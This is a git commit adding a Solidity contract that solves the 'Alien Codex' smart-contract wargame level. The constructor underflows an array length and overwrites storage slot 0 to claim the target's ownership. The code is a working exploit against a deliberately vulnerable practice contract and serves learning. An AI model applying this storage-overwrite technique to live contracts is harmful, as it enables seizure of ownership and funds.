b5bb8031fed99607748f7e40ead261f1fc39efbe
eliashezron <eliashezron23@gmail.com>
2023-01-25 19:24:11 +0300

    Alien Codex complete

---
+++ contracts/level19-AlienCodex.sol
@@ -0,0 +1,34 @@
+pragma solidity ^0.8;
+
+// the goal is to claim ownership of this contract
+
+interface IAlienCodex {
+    function owner() external view returns (address);
+    function codex(uint256) external view returns (bytes32);
+    function retract() external;
+    function make_contact() external;
+    function revise(uint256 i, bytes32 _content) external;
+}
+
+contract Hack {
+    /*
+    storage
+    0 - owner
+    0 - contact
+    1 - length of the array codex
+    // slot where array element is stored = keccak256(slot)) + index
+    */
+    constructor(IAlienCodex target) {
+        target.make_contact();
+        target.retract();
+        uint256 s = uint256(keccak256(abi.encode(uint256(1))));
+        uint256 i;
+        unchecked {
+            // s + i = 0 = 2**256
+            i -= s;
+        }
+
+        target.revise(i, bytes32(uint256(uint160(msg.sender))));
+        require(target.owner() == msg.sender, "hack failed");
+    }
+}
